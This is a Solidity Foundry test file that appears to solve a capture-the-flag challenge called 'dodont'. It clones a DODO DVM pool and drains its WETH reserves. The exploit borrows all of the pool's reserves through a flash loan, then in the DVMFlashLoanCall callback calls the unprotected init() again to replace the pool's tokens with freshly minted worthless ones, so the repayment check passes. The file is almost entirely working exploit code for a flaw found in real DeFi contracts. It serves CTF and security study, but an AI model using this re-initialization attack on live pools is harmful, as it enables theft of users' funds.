// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/dodont/Challenge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface CloneFactoryLike {
    function clone(address) external returns (address);
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function buyShares(address) external;
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _QUOTE_TOKEN_() external view returns (address);
}

contract QuoteToken is ERC20 {
    constructor() ERC20("Quote Token", "QT") {
        _mint(msg.sender, 1_000_000 ether);
    }
}

contract DoDontTest is Test {
    CloneFactoryLike private immutable CLONE_FACTORY = CloneFactoryLike(0x5E5a7b76462E4BdF83Aa98795644281BdbA80B88);
    address private immutable DVM_TEMPLATE = 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445;

    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    QuoteToken quoteToken;
    DVMLike dvm;
    Challenge public challenge;

    function setUp() public {
        payable(address(WETH)).call{value: 100 ether}(hex"");

        quoteToken = new QuoteToken();

        dvm = DVMLike(CLONE_FACTORY.clone(DVM_TEMPLATE));
        dvm.init(
            address(this),
            address(WETH),
            address(quoteToken),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );

        WETH.transfer(address(dvm), WETH.balanceOf(address(this)));
        quoteToken.transfer(address(dvm), quoteToken.balanceOf(address(this)) / 2);
        dvm.buyShares(address(this));

        challenge = new Challenge(address(dvm));
    }

    function test_exploitdodont() public {
        dvm.flashLoan(WETH.balanceOf(address(dvm)), quoteToken.balanceOf(address(dvm)), address(this), hex"11");
        if (challenge.isSolved()) {
            console.log("solved");
        } else {
            console.log("not solved");
        }
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        QuoteToken t1 = new QuoteToken();
        QuoteToken t2 = new QuoteToken();
        t1.transfer(address(dvm), 1_000_000 ether);
        t2.transfer(address(dvm), 1_000_000 ether);

        dvm.init(
            address(this),
            address(t1),
            address(t2),
            3000000000000000,
            address(0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01),
            1,
            1000000000000000000,
            false
        );
    }
}
